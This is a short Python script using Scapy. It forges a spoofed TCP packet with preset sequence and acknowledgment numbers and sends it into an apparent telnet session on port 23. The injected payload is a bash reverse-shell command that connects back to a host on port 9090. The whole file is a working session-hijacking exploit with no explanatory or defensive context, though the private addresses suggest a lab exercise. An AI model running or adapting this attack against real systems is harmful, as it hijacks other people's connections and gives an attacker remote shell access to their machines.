#!/usr/bin/python3
from scapy.all import *
import binascii

ip = IP(src='192.168.137.2', dst='192.168.137.172')
tcp = TCP(sport=41190, dport=23, flags="AP", seq=150966078, ack=333437326)
data = '/bin/bash -i > /dev/tcp/192.168.137.205/9090 0<&1 2>&1\r'
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)